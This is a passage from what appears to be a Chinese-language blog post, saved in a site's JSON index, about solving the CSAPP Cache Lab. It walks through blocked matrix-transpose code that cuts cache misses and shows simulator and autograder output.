+= 8) for (int j = 0; j &lt; M; j += 8) for (int m = i; m &lt; i + 8; ++m) for (int n = j; n &lt; j + 8; ++n) B[n][m] = A[m][n];} 这样 8 x 8 的一组，就可以让 cache 被充分的利用起来。 实验结果： 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:1710, misses:343, evictions:311Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151Summary for official submission (func 0): correctness=1 misses=343TEST_TRANS_RESULTS=1:343 8 x 8 分块最优性能探讨 为了探讨最优性能，我再理一遍 cache 的运行过程。在 A，B两个矩阵中，cache set 是这样被分配的。 $$\\begin{array}{l}0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0\\4&amp;4&amp;4&amp;4&amp;4&amp;4&amp;4&amp;4\\8&amp;8&amp;8&amp;8&amp;8&amp;8&amp;8&amp;8\\12&amp;12&amp;12&amp;12&amp;12&amp;12&amp;12&amp;12\\16&amp;16&amp;16&amp;16&amp;16&amp;16&amp;16&amp;16\\20&amp;20&amp;20&amp;20&amp;20&amp;20&amp;20&amp;20\\24&amp;24&amp;24&amp;24&amp;24&amp;24&amp;24&amp;24\\28&amp;28&amp;28&amp;28&amp;28&amp;28&amp;28&amp;28 \\end{array}$$ 这个 8x8 的矩阵表示的就是 第一个分块矩阵的 set 的位置。我们以这个小的矩阵为例，解释原始方法和上文中的 8x8 方法为什么有大量的 cache miss。 当我们使用原始方法的时候，我们首先访问的是A[0][0]，这会造成一次 cold miss，然后写入 B[0][0]， 又会造成一次 conflict miss，接下来访问A[0][1]，会造成一次 conflict miss，在写入 B[1][0] 会造成一次 cold miss，我们可以发现有大量的 miss 被用在 A，B 矩阵的转换的过程中了。 那么再看 8x8 的矩阵的情况。8x8 的矩阵就是为了防止 A，B之间大量的冲突。可以发现在 8x8 的矩阵中，除了对角线，其他A，B中相对应的元素都是在不同的 set 中的。这样可以减少大量的 conflict miss。每个小块中，先按照行读A，再按照列写B，在这样的情况下，每个A的8x8 的块中只有第一列会出现 cold miss，每个B的 8x8 的块中只有第一列会出现 cold miss，但是 B的对角线上会出现 conflict miss，那么我们可以估计出总的 miss 数量应该是 在A中有 16 x 8 = 128 misses，在B中有 16 x 8 + 28(对角线) = 156 misses，那么如果能够消除对角线上的 conflict miss，我们就可以得到 总计 256 次 misses 的最优性能。 考虑到我们可以使用 最多 12 个额外的参数，我们可以使用另外的 8 个参数来避免conflict 问题。 1234567891011121314151617181920212223if(M == 32){ int tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7, tmp8; for (int i = 0; i &lt; 32; i += 8) for(int j = 0; j &lt; 32; j += 8) for(int k = i; k &lt; (i + 8); ++k){ tmp1 = A[k][j]; tmp2 = A[k][j+1]; tmp3 = A[k][j+2]; tmp4 = A[k][j+3]; tmp5 = A[k][j+4]; tmp6 = A[k][j+5]; tmp7 = A[k][j+6]; tmp8 = A[k][j+7]; B[j][k] = tmp1; B[j+1][k] = tmp2; B[j+2][k] = tmp3; B[j+3][k] = tmp4; B[j+4][k] = tmp5; B[j+5][k] = tmp6; B[j+6][k] = tmp7; B[j+7][k] = tmp8; }} 结果如下： 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:1766, misses:287, evictions:255Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151Summary for official submission (func 0): correctness=1 misses=287TEST_TRANS_RESULTS=1:287 2.2 64 x 64对 64 x 64 的矩阵来说，每行有 64 个 int，则 cache 只能存矩阵的 4 行了，所以 8x8 的分块肯定是有问题的，如果使用 8x8 的分块，一定会在写 B 的时候造成冲突。我们先用 4x4 的矩阵分块跑一下试试。 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:6498, misses:1699, evictions:1667Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691Summary for official submission (func 0): correctness=1 misses=1699TEST_TRANS_RESULTS=1:1699 实验结果并不是很理想。 优化 我们可以使用先 8 分块，再使用 4 分块的方法来实现。我们仍然从 set 冲突的角度上来考虑。 1234567891011121314151617181920212223242526if (M == 64) { int i, j, x, y; int x1, x2, x3, x4, x5, x6, x7, x8; for (i = 0; i &lt; N; i += 8) for (j = 0; j &lt; M; j += 8){ for (x = i; x &lt; i + 4; ++x){ x1 = A[x][j]; x2 = A[x][j+1]; x3 = A[x][j+2]; x4 = A[x][j+3]; x5 = A[x][j+4]; x6 = A[x][j+5]; x7 = A[x][j+6]; x8 = A[x][j+7]; B[j][x] = x1; B[j+1][x] = x2; B[j+2][x] = x3; B[j+3][x] = x4; B[j][x+4] = x5; B[j+1][x+4] = x6; B[j+2][x+4] = x7; B[j+3][x+4] = x8; } for (y = j; y &lt; j + 4; ++y){ x1 = A[i+4][y]; x2 = A[i+5][y]; x3 = A[i+6][y]; x4 = A[i+7][y]; x5 = B[y][i+4]; x6 = B[y][i+5]; x7 = B[y][i+6]; x8 = B[y][i+7]; B[y][i+4] = x1; B[y][i+5] = x2; B[y][i+6] = x3; B[y][i+7] = x4; B[y+4][i] = x5; B[y+4][i+1] = x6; B[y+4][i+2] = x7; B[y+4][i+3] = x8; } for (x = i + 4; x &lt; i + 8; ++x){ x1 = A[x][j+4]; x2 = A[x][j+5]; x3 = A[x][j+6]; x4 = A[x][j+7]; B[j+4][x] = x1; B[j+5][x] = x2; B[j+6][x] = x3; B[j+7][x] = x4; } } } 最终结果 12345678910111213Function 0 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:9066, misses:1179, evictions:1147Function 1 (2 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691Summary for official submission (func 0): correctness=1 misses=1179TEST_TRANS_RESULTS=1:1179 2.3 61 x 67考虑其他的分块大小。 最简单的方法就是做 8x8 的分块。分块的方式和上文中的一样，但是任然存在 A，B之间反复conflict miss 的问题。 最终的结果如下： 1234567891011121314151617181920212223242526Part A: Testing cache simulatorRunning ./test-csim Your simulator Reference simulatorPoints (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27Part B: Testing transpose functionRunning ./test-trans -M 32 -N 32Running ./test-trans -M 64 -N 64Running ./test-trans -M 61 -N 67Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 8.0 8 287Trans perf 64x64 8.0 8 1179Trans perf 61x67 10.0 10 1905 Total points 53.0 53","link":"/2022/03/05/%5Bcsapp%5D%20Lab4%20Cache%20Lab/"}],"tags":[{"name":"DL EMA","slug":"DL-EMA","link":"/tags/DL-EMA/"},{"name":"quote","slug":"quote","link":"/tags/quote/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"期末复习","slug":"期末复习","link":"/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"name":"CSAPP","slug":"CSAPP","link":"/tags/CSAPP/"},{"name":"computer-architecture","slug":"computer-architecture","link":"/tags/computer-architecture/"}],"categories":[{"name":"DL","slug":"DL","link":"/categories/DL/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"computer architecture","slug":"computer-architecture","link":"/categories/computer-architecture/"}]}